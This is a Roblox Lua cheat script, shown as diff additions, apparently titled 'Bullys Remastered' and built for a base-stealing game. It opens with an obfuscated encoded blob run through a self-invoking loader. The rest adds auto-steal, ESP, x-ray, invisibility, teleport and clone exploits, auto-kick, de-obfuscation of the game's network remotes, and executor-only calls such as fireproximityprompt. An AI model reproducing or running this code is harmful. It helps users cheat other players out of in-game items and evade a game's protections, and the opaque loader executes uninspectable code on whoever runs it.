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',{[3]=Ie,[2]=Jc,[4]=T,[1]=z})end)()(...)
+local Services = {
+    Players = game:GetService("Players"),
+    RunService = game:GetService("RunService"),
+    UserInputService = game:GetService("UserInputService"),
+    ReplicatedStorage = game:GetService("ReplicatedStorage"),
+    TweenService = game:GetService("TweenService"),
+    HttpService = game:GetService("HttpService"),
+    Workspace = game:GetService("Workspace"),
+    Lighting = game:GetService("Lighting"),
+    VirtualInputManager = game:GetService("VirtualInputManager"),
+    GuiService = game:GetService("GuiService"),
+    TeleportService = game:GetService("TeleportService"),
+}
+local Players = Services.Players
+local RunService = Services.RunService
+local UserInputService = Services.UserInputService
+local ReplicatedStorage = Services.ReplicatedStorage
+local TweenService = Services.TweenService
+local HttpService = Services.HttpService
+local Workspace = Services.Workspace
+local Lighting = Services.Lighting
+local VirtualInputManager = Services.VirtualInputManager
+local GuiService = Services.GuiService
+local TeleportService = Services.TeleportService
+local LocalPlayer = Players.LocalPlayer
+local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
+
+local Decrypted
+Decrypted = setmetatable({}, {
+    __index = function(S, ez)
+        local Netty = ReplicatedStorage.Packages.Net
+        local prefix, path
+        if     ez:sub(1,3) == "RE/" then prefix = "RE/";  path = ez:sub(4)
+        elseif ez:sub(1,3) == "RF/" then prefix = "RF/";  path = ez:sub(4)
+        else return nil end
+        local Remote
+        for i, v in Netty:GetChildren() do
+            if v.Name == ez then
+                Remote = Netty:GetChildren()[i + 1]
+                break
+            end
+        end
+        if Remote and not rawget(Decrypted, ez) then rawset(Decrypted, ez, Remote) end
+        return rawget(Decrypted, ez)
+    end
+})
+local Utility = {}
+function Utility:LarpNet(F) return Decrypted[F] end
+
+-- Safe conversion for configurable keybind strings.
+local function safeKeyCode(name, fallback)
+    if type(name) ~= "string" then return fallback end
+    local cleaned = name:gsub("^%s+", ""):gsub("%s+$", "")
+    if cleaned == "" or cleaned == "--" then return fallback end
+    local ok, kc = pcall(function() return Enum.KeyCode[cleaned] end)
+    if ok and kc then return kc end
+    return fallback
+end
+
+local FileName = "BullysRemastered_v1.json" 
+local DefaultConfig = {
+    Positions = {
+        AdminPanel = {X = 0.1859375, Y = 0.5767123526556385}, 
+        AdminToolsPanel = {X = 0.02, Y = 0.25},
+        StealSpeed = {X = 0.02, Y = 0.18}, 
+        Settings = {X = 0.834375, Y = 0.43590998043052839}, 
+        InvisPanel = {X = 0.8578125, Y = 0.17260276361454258}, 
+        AutoSteal = {X = 0.02, Y = 0.35}, 
+        JobJoiner = {X = 0.5, Y = 0.85},
+        AutoBuy   = {X = 0.01, Y = 0.35},
+        StealersHUD = {X = 0.8, Y = 0.15},
+    }, 
+    TpSettings = {
+        Tool           = "Flying Carpet",
+        Speed          = 2, 
+        TpKey          = "T",
+        CloneKey       = "V",
+        TpOnLoad       = false,
+        MinGenForTp    = "",
+        CarpetSpeedKey = "Q",
+        InfiniteJump   = false,
+    },
+    StealSpeed   = 20,
+    ShowStealSpeedPanel = true,
+    MenuKey      = "LeftControl",
+    XrayEnabled  = true,
+    AntiRagdoll  = 0,
+    AntiRagdollV2 = true,
+    PlayerESP    = true,
+    FPSBoost     = true,
+    TracerEnabled = true,
+    BrainrotESP = true,
+    LineToBase = false,
+    StealNearest = false,
+    StealHighest = true,
+    StealPriority = false,
+    DefaultToNearest = false,
+    DefaultToHighest = false,
+    DefaultToPriority = false,
+    AutoBack = false,
+    ShowStealingHUD = true,
+    ShowStealingPlotESP = true,
+    ConveyorESP = false,
+    PriorityList = {},
+    DefaultToDisable = false,
+    UILocked     = false,
+    HideAdminPanel = false,
+    ShowAdminToolsPanel = true,
+    HideAutoSteal = false,
+    AutoKickOnSteal = false,
+    InstantSteal = false,
+    InvisStealAngle = 233,
+    SinkSliderValue = 2.5,
+    AutoRecoverLagback = true,
+    AutoInvisDuringSteal = false,
+    InvisToggleKey = "I",
+    ClickToAP = false,
+    ClickToAPKeybind = "L",
+    ProximityAP = false,
+    ProximityAPKeybind = "P",
+    ProximityRange = 15,
+    StealSpeedKey = "C",
+    ShowInvisPanel = true,
+    ResetKey = "X",
+    AntiBeeDisco = false,
+    FOV = 70,
+    SubspaceMineESP = false,
+    AutoUnlockOnSteal = false,
+    ShowUnlockButtonsHUD = true,
+    AutoTPOnFailedSteal = false,
+    AutoTPPriority = true,
+    KickKey = "",
+    CleanErrorGUIs = false,
+    ClickToAPSingleCommand = false,
+    RagdollSelfKey = "",
+    AlertsEnabled = true,
+    AlertSoundID = "rbxassetid://6518811702",
+    AutoStealSpeed = false,
+    ShowJobJoiner = true,
+    JobJoinerKey = "J",
+    CurrentTheme = "preto",
+    ShowMiniActions = true,
+    AutoHideMiniUI = false,
+    MiniUIPos = {X = 0.01, Y = 0.35},
+    MiniUILocked = false,
+    Blacklist = {},
+    BlacklistESP = true,
+    BlacklistMsg = "BLOCKED",
+    AutoBuyEnabled = false,
+    AutoBuyKey = "K",
+    AutoBuyRange = 17,
+    AutoBuyColor = {R=0, G=220, B=255},
+    HideAutoBuyUI = false,
+    HideStealSpeedUI = false,
+    HideStatusHUD = false,
+    HideInvisPanel = false,
+}
+
+
+local Config = DefaultConfig
+
+if isfile and isfile(FileName) then
+    pcall(function()
+        local ok, decoded = pcall(function() return HttpService:JSONDecode(readfile(FileName)) end)
+        if not ok then return end
+        for k, v in pairs(DefaultConfig) do
+            if decoded[k] == nil then decoded[k] = v end
+        end
+        if decoded.TpSettings then
+            for k, v in pairs(DefaultConfig.TpSettings) do
+                if decoded.TpSettings[k] == nil then decoded.TpSettings[k] = v end
+            end
+        end
+        if decoded.Positions then
+            for k, v in pairs(DefaultConfig.Positions) do
+                if decoded.Positions[k] == nil then decoded.Positions[k] = v end
+            end
+        end
+        if type(decoded.Blacklist) ~= "table" then decoded.Blacklist = {} end
+        Config = decoded
+    end)
+end
+Config.ProximityAP = false
+
+if Config.CurrentTheme and THEMES and THEMES[Config.CurrentTheme] then
+    for k, v in pairs(THEMES[Config.CurrentTheme]) do Theme[k] = v end
+end
+
+local function SaveConfig()
+    if writefile then
+        pcall(function()
+            local toSave = {}
+            for k, v in pairs(Config) do toSave[k] = v end
+            toSave.ProximityAP = false
+            writefile(FileName, HttpService:JSONEncode(toSave))
+        end)
+    end
+end
+
+_G.InvisStealAngle = Config.InvisStealAngle
+_G.SinkSliderValue = Config.SinkSliderValue
+_G.AutoRecoverLagback = Config.AutoRecoverLagback
+_G.AutoInvisDuringSteal = Config.AutoInvisDuringSteal
+do
+    local invisKey = Enum.KeyCode.I
+    if type(Config.InvisToggleKey) == "string" and Config.InvisToggleKey ~= "" then
+        local ok, kc = pcall(function() return Enum.KeyCode[Config.InvisToggleKey] end)
+        if ok and kc then invisKey = kc end
+    end
+    _G.INVISIBLE_STEAL_KEY = invisKey
+end
+_G.invisibleStealEnabled = false
+_G.RecoveryInProgress = false
+
+local function getControls()
+	local playerScripts = LocalPlayer:WaitForChild("PlayerScripts")
+	local playerModule = require(playerScripts:WaitForChild("PlayerModule"))
+	return playerModule:GetControls()
+end
+
+local Controls = getControls()
+
+local function kickPlayer()
+    local ok = pcall(function()
+        if game.Shutdown then
+            game:Shutdown()
+        else
+            LocalPlayer:Kick("\nBULLYS REMASTERED")
+        end
+    end)
+    if not ok then
+        pcall(function() LocalPlayer:Kick("\nBULLYS REMASTERED") end)
+    end
+end
+
+local function walkForward(seconds)
+    local char = LocalPlayer.Character
+    local hum = char:FindFirstChild("Humanoid")
+    local hrp = char:FindFirstChild("HumanoidRootPart")
+    local Controls = getControls()
+    local lookVector = hrp.CFrame.LookVector
+    Controls:Disable()
+    local startTime = os.clock()
+    local conn
+    conn = RunService.RenderStepped:Connect(function()
+        if os.clock() - startTime >= seconds then
+            conn:Disconnect()
+            hum:Move(Vector3.zero, false)
+            Controls:Enable()
+            return
+        end
+        hum:Move(lookVector, false)
+    end)
+end
+
+
+local function instantClone()
+    if _G.isCloning then return end
+    _G.isCloning = true
+
+    local ok, err = pcall(function()
+        local char = LocalPlayer.Character
+        local hum = char and char:FindFirstChildOfClass("Humanoid")
+        if not (char and hum) then error("No character") end
+
+        local cloner =
+            LocalPlayer.Backpack:FindFirstChild("Quantum Cloner")
+            or char:FindFirstChild("Quantum Cloner")
+
+        if not cloner then error("No Quantum Cloner") end
+
+        pcall(function()
+            hum:EquipTool(cloner)
+        end)
+
+        task.wait(0.05)
+
+        cloner:Activate()
+        task.wait(0.05)
+
+        local cloneName = tostring(LocalPlayer.UserId) .. "_Clone"
+        for _ = 1, 100 do
+            if Workspace:FindFirstChild(cloneName) then break end
+            task.wait(0.1)
+        end
+
+        if not Workspace:FindFirstChild(cloneName) then
+            error("")
+        end
+
+        local toolsFrames = LocalPlayer.PlayerGui:FindFirstChild("ToolsFrames")
+        local qcFrame = toolsFrames and toolsFrames:FindFirstChild("QuantumCloner")
+        local tpButton = qcFrame and qcFrame:FindFirstChild("TeleportToClone")
+        if not tpButton then error("Teleport button missing") end
+
+        tpButton.Visible = true
+
+        if firesignal then
+            firesignal(tpButton.MouseButton1Up)
+        else
+            local vim = cloneref and cloneref(game:GetService("VirtualInputManager")) or VirtualInputManager
+            local inset = (cloneref and cloneref(game:GetService("GuiService")) or GuiService):GetGuiInset()
+            local pos = tpButton.AbsolutePosition + (tpButton.AbsoluteSize / 2) + inset
+
+            vim:SendMouseButtonEvent(pos.X, pos.Y, 0, true, game, 1)
+            task.wait()
+            vim:SendMouseButtonEvent(pos.X, pos.Y, 0, false, game, 1)
+        end
+    end)
+
+    _G.isCloning = false
+end
+
+local function triggerClosestUnlock(yLevel, maxY)
+    local character = LocalPlayer.Character
+    local hrp = character and character:FindFirstChild("HumanoidRootPart")
+    if not hrp then return end
+
+    local playerY = yLevel or hrp.Position.Y
+    local Y_THRESHOLD = 5
+
+    local bestPromptSameLevel = nil
+    local shortestDistSameLevel = math.huge
+
+    local bestPromptFallback = nil
+    local shortestDistFallback = math.huge
+    
+    local plots = Workspace:FindFirstChild("Plots")
+    if not plots then return end
+
+    for _, obj in ipairs(plots:GetDescendants()) do
+        if obj:IsA("ProximityPrompt") and obj.Enabled then
+            local part = obj.Parent
+            if part and part:IsA("BasePart") then
+                if maxY and part.Position.Y > maxY then
+                else
+                    local distance = (hrp.Position - part.Position).Magnitude
+                    local yDifference = math.abs(playerY - part.Position.Y)
+
+                    if distance < shortestDistFallback then
+                        shortestDistFallback = distance
+                        bestPromptFallback = obj
+                    end
+
+                    if yDifference <= Y_THRESHOLD then
+                        if distance < shortestDistSameLevel then
+                            shortestDistSameLevel = distance
+                            bestPromptSameLevel = obj
+                        end
+                    end
+                end
+            end
+        end
+    end
+
+    local targetPrompt = bestPromptSameLevel or bestPromptFallback
+
+    if targetPrompt then
+        if fireproximityprompt then
+            fireproximityprompt(targetPrompt)
+        else
+            targetPrompt:InputBegan(Enum.UserInputType.MouseButton1)
+            task.wait(0.05)
+            targetPrompt:InputEnded(Enum.UserInputType.MouseButton1)
+        end
+    end
+end
+
+local Theme = {
+    Background      = Color3.fromRGB(10, 10, 10),
+    Surface         = Color3.fromRGB(20, 20, 20),
+    SurfaceHighlight= Color3.fromRGB(32, 32, 32),
+    Accent1         = Color3.fromRGB(170, 170, 170),
+    Accent2         = Color3.fromRGB(125, 125, 125),
+    TextPrimary     = Color3.fromRGB(240, 240, 240),
+    TextSecondary   = Color3.fromRGB(185, 185, 185),
+    Success         = Color3.fromRGB(170, 170, 170),
+    Error           = Color3.fromRGB(210, 90, 90),
+}
+
+THEMES = {
+    preto = {
+        Background       = Color3.fromRGB(10, 10, 10),
+        Surface          = Color3.fromRGB(20, 20, 20),
+        SurfaceHighlight = Color3.fromRGB(32, 32, 32),
+        Accent1          = Color3.fromRGB(170, 170, 170),
+        Accent2          = Color3.fromRGB(125, 125, 125),
+        TextPrimary      = Color3.fromRGB(240, 240, 240),
+        TextSecondary    = Color3.fromRGB(185, 185, 185),
+        Success          = Color3.fromRGB(170, 170, 170),
+        Error            = Color3.fromRGB(210, 90, 90),
+        GlowColor1       = Color3.fromRGB(170, 170, 170),
+        GlowColor2       = Color3.fromRGB(125, 125, 125),
+    },
+}
+
+function applyTheme(themeName)
+    local t = THEMES[themeName]
+    if not t then return end
+
+    local colorMap = {}
+    for k, oldColor in pairs(Theme) do
+        if t[k] then
+            colorMap[oldColor] = t[k]
+        end
+    end
+
+    for k, v in pairs(t) do
+        Theme[k] = v
+    end
+    Config.CurrentTheme = themeName
+    SaveConfig()
+
+    local function matchColor(c1, c2)
+        if not c1 or not c2 then return false end
+        local dr = math.abs(c1.R - c2.R)
+        local dg = math.abs(c1.G - c2.G)
+        local db = math.abs(c1.B - c2.B)
+        return (dr + dg + db) < 0.04
+    end
+
+    local function remapColor(c)
+        if not c then return c end
+        for oldC, newC in pairs(colorMap) do
+            if matchColor(c, oldC) then return newC end
+        end
+        return c
+    end
+
+    local guiNames = {
+        "AutoStealUI", "XiAdminPanel", "SettingsUI",
+        "BullysStatusHUD", "BullysNotif",
+        "BullysThemeUI", "PriorityListGUI", "BullysJobJoiner", "BullysPriorityAlert",
+        "BullysSettings"
+    }
+
+    for _, guiName in ipairs(guiNames) do
+        local sg = PlayerGui:FindFirstChild(guiName)
+        if sg then
+            for _, obj in ipairs(sg:GetDescendants()) do
+                pcall(function()
+                    if obj:IsA("Frame") or obj:IsA("TextButton") or
+                       obj:IsA("TextBox") or obj:IsA("ScrollingFrame") or
+                       obj:IsA("ImageLabel") then
+                        if obj.BackgroundTransparency < 1 then
+                            obj.BackgroundColor3 = remapColor(obj.BackgroundColor3)
+                        end
+                    end
+                    if obj:IsA("TextLabel") or obj:IsA("TextButton") or obj:IsA("TextBox") then
+                        obj.TextColor3 = remapColor(obj.TextColor3)
+                    end
+                    if obj:IsA("UIStroke") then
+                        obj.Color = remapColor(obj.Color)
+                    end
+                    if obj:IsA("ScrollingFrame") then
+                        obj.ScrollBarImageColor3 = remapColor(obj.ScrollBarImageColor3)
+                    end
+                    if obj:IsA("UIGradient") then
+                        local kps = obj.Color.Keypoints
+                        local changed = false
+                        local newKps = {}
+                        for _, kp in ipairs(kps) do
+                            local nc = remapColor(kp.Value)
+                            if nc ~= kp.Value then changed = true end
+                            table.insert(newKps, ColorSequenceKeypoint.new(kp.Time, nc))
+                        end
+                        if changed then
+                            obj.Color = ColorSequence.new(newKps)
+                        end
+                    end
+                    if obj:IsA("Beam") then
+                        local kps = obj.Color.Keypoints
+                        local newKps = {}
+                        for _, kp in ipairs(kps) do
+                            table.insert(newKps, ColorSequenceKeypoint.new(kp.Time, remapColor(kp.Value)))
+                        end
+                        obj.Color = ColorSequence.new(newKps)
+                    end
+                end)
+            end
+            pcall(function()
+                local root = sg:FindFirstChildWhichIsA("Frame")
+                if root and root.BackgroundTransparency < 1 then
+                    root.BackgroundColor3 = remapColor(root.BackgroundColor3)
+                end
+            end)
+        end
+    end
+
+    task.spawn(function()
+        local savedTab  = (_G.BullysSettingsUI and _G.BullysSettingsUI.currentTab) or "cfg"
+        local wasVis    = _G.BullysSettingsUI and _G.BullysSettingsUI.panel and _G.BullysSettingsUI.panel.Visible
+        if buildBullysSettingsUI then
+            buildBullysSettingsUI()
+        end
+        task.wait()
+        if _G.BullysSettingsUI then
+            if _G.BullysSettingsUI.switchTab then
+                _G.BullysSettingsUI.switchTab(savedTab)
+            end
+            if wasVis and _G.BullysSettingsUI.panel then
+                _G.BullysSettingsUI.panel.Visible = true
+            end
+        end
+        if _G.rebuildStatusHUD then
+            _G.rebuildStatusHUD()
+        end
+        if _G.updateAutoBuyRingColor then _G.updateAutoBuyRingColor() end
+        if _G.rebuildAutoBuyCirclePresets then _G.rebuildAutoBuyCirclePresets() end
+        if buildMiniActionsUI then
+            local miniWasVis = _G.MiniActionsUI and _G.MiniActionsUI.panel and _G.MiniActionsUI.panel.Visible
+            buildMiniActionsUI()
+            task.wait()
+            if miniWasVis and _G.MiniActionsUI and _G.MiniActionsUI.panel then
+                _G.MiniActionsUI.panel.Visible = true
+            end
+        end
+
+        local guisRT = {"AutoStealUI","XiAdminPanel","SettingsUI","BullysSettings","BullysStatusHUD","BullysAutoBuyUI","BullysMiniActions"}
+        for _, gn in ipairs(guisRT) do
+            local sg = PlayerGui:FindFirstChild(gn)
+            if sg then
+                for _, obj in ipairs(sg:GetDescendants()) do
+                    if obj.Name == "RacetrackBorder" and obj:IsA("UIStroke") then
+                        local g2 = obj:FindFirstChildOfClass("UIGradient")
+                        if g2 then
+                            g2.Color = ColorSequence.new{
+                                ColorSequenceKeypoint.new(0, Theme.Accent1),
+                                ColorSequenceKeypoint.new(1, Theme.Accent2),
+                            }
+                            g2.Rotation = 0
+                            obj.Color = Theme.Accent1
+                        end
+                    end
+                end
+            end
+        end
+    end)
+
+    if ShowNotification then
+    ShowNotification("TEMA", "Tema " .. themeName .. " aplicado!")
+end
+end
+
+function addRacetrackBorder(parentFrame, speed)
+    if not parentFrame or not parentFrame:IsA("Frame") then return end
+    local CYAN_A = Color3.fromRGB(170, 170, 170)
+    local CYAN_B = Color3.fromRGB(125, 125, 125)
+    speed = tonumber(speed) or 2.8
+
+    local stroke = Instance.new("UIStroke")
+    stroke.Name = "RacetrackBorder"
+    stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+    stroke.Thickness  = 1.6
+    stroke.Color      = Color3.new(1, 1, 1)
+    stroke.Transparency = 0.14
+    stroke.Parent = parentFrame
+
+    local grad = Instance.new("UIGradient")
+    grad.Color = ColorSequence.new{
+        ColorSequenceKeypoint.new(0.00, CYAN_A),
+        ColorSequenceKeypoint.new(0.20, CYAN_B),
+        ColorSequenceKeypoint.new(0.50, CYAN_A),
+        ColorSequenceKeypoint.new(0.80, CYAN_B),
+        ColorSequenceKeypoint.new(1.00, CYAN_A),
+    }
+    grad.Rotation = 0
+    grad.Parent   = stroke
+
+    local t0 = tick()
+    local conn
+    conn = RunService.Heartbeat:Connect(function()
+        if not parentFrame.Parent or not stroke.Parent or not grad.Parent then
+            if conn then conn:Disconnect() end
+            return
+        end
+        local t = tick() - t0
+        local p = (t / speed) % 1
+        grad.Rotation = (p * 360)
+        stroke.Transparency = 0.12 + (math.sin(t * 4.2) + 1) * 0.5 * 0.16
+    end)
+
+    return stroke
+end
+
+local PRIORITY_LIST = {
+  "Headless Horseman","Strawberry Elephant","Meowl","Signore Carapace","Skibidi Toilet","Griffin","Love Love Bear","Dragon Gingerini","Elefanto Frigo","Ginger Gerat","La Supreme Combinasion","Antonio","Dragon Cannelloni","Hydra Dragon Cannelloni","Dug dug dug","Ketupat Bros","Tirilikalika Tirilikalako","La Casa Boo","Los Amigos","Cerberus","Celestial Pegasus","Cooki and Milki","Rosey and Teddy","Reinito Sleighito","Capitano Moby","Spooky and Pumpky","Fragrama and Chocrama","Garama and Madundung","La Food Combinasion","Burguro and Fryuro","Popcuru and Fizzuru","Ketchuru and Musturu","La Secret Combinasion","Tralaledon","Tictac Sahur","Ketupat Kepat","Tang Tang Keletang","Orcaledon","La Ginger Sekolah","Los Spaghettis","Lavadorito Spinito","Swaggy Bros","La Taco Combinasion","Los Primos","Chillin Chili","Tuff Toucan","W or L","Chillin Chili","Chipso and Queso","Fishino Clownino"
+}
+
+do
+    local saved = Config and Config.PriorityList
+    if saved and type(saved) == "table" and #saved > 0 then
+        PRIORITY_LIST = saved
+    end
+end
+
+local function savePriorityToConfig()
+    Config.PriorityList = {}
+    for i, v in ipairs(PRIORITY_LIST) do Config.PriorityList[i] = v end
+    SaveConfig()
+end
+
+local function findAdorneeGlobal(animalData)
+    if not animalData then return nil end
+    local plot = Workspace:FindFirstChild("Plots") and Workspace.Plots:FindFirstChild(animalData.plot)
+    if plot then
+        local podiums = plot:FindFirstChild("AnimalPodiums")
+        if podiums then
+            local podium = podiums:FindFirstChild(animalData.slot)
+            if podium then
+                local base = podium:FindFirstChild("Base")
+                if base then
+                    local spawn = base:FindFirstChild("Spawn")
+                    if spawn then return spawn end
+                    return base:FindFirstChildWhichIsA("BasePart") or base
+                end
+            end
+        end
+    end
+    return nil
+end
+
+local function CreateGradient(parent)
+    local g = Instance.new("UIGradient", parent)
+    g.Color = ColorSequence.new{
+        ColorSequenceKeypoint.new(0, Theme.Accent2),
+        ColorSequenceKeypoint.new(1, Theme.Accent2)
+    }
+    g.Rotation = 45
+    return g
+end
+
+local function MakeDraggable(handle, target, saveKey)
+    local dragging, dragInput, dragStart, startPos
+
+    handle.InputBegan:Connect(function(input)
+        if Config.UILocked then return end
+        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+            dragging = true
+            dragStart = input.Position
+            startPos = target.Position
+            
+            input.Changed:Connect(function()
+                if input.UserInputState == Enum.UserInputState.End then
+                    dragging = false
+                    if saveKey then
+                        local parentSize = target.Parent.AbsoluteSize
+                        Config.Positions[saveKey] = {
+                            X = target.AbsolutePosition.X / parentSize.X,
+                            Y = target.AbsolutePosition.Y / parentSize.Y,
+                        }
+                        SaveConfig()
+                    end
+                end
+            end)
+        end
+    end)
+
+    handle.InputChanged:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+            dragInput = input
+        end
+    end)
+
+    UserInputService.InputChanged:Connect(function(input)
+        if input == dragInput and dragging then
+            local delta = input.Position - dragStart
+            target.Position = UDim2.new(
+                startPos.X.Scale, startPos.X.Offset + delta.X,
+                startPos.Y.Scale, startPos.Y.Offset + delta.Y
+            )
+        end
+    end)
+end
+
+local DANGER_TOOLS = {
+    ["Boogie Bomb"] = true,
+    ["Medusa's Head"] = true,
+    ["Body Swap Potion"] = true,
+    ["Laser Cape"] = true,
+    ["Rainbowrath Sword"] = true,
+    ["Gummy Bear"] = true,
+}
+local function isMobileDevice()
+    return UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled and not UserInputService.MouseEnabled
+end
+local IS_MOBILE = isMobileDevice()
+local function ApplyViewportUIScaleAdmin(targetFrame, _, _, minScale, maxScale)
+    if not targetFrame or not IS_MOBILE then return end
+    local existing = targetFrame:FindFirstChildOfClass("UIScale")
+    if existing then existing:Destroy() end
+    local sc = Instance.new("UIScale")
+    sc.Parent = targetFrame
+    sc.Scale = math.clamp(0.65, minScale or 0.45, maxScale or 0.85)
+end
+local function AddMobileMinimizeAdmin(frame, labelText)
+    if not IS_MOBILE or not frame then return end
+    local header = frame:FindFirstChildWhichIsA("Frame")
+    if not header then return end
+    local minimizeBtn = Instance.new("TextButton")
+    minimizeBtn.Size = UDim2.new(0, 26, 0, 26)
+    minimizeBtn.Position = UDim2.new(1, -30, 0, 6)
+    minimizeBtn.BackgroundColor3 = Theme.SurfaceHighlight
+    minimizeBtn.Text = "-"
+    minimizeBtn.Font = Enum.Font.GothamBlack
+    minimizeBtn.TextSize = 18
+    minimizeBtn.TextColor3 = Theme.TextPrimary
+    minimizeBtn.AutoButtonColor = false
+    minimizeBtn.Parent = header
+    Instance.new("UICorner", minimizeBtn).CornerRadius = UDim.new(0, 8)
+    local guiParent = frame.Parent
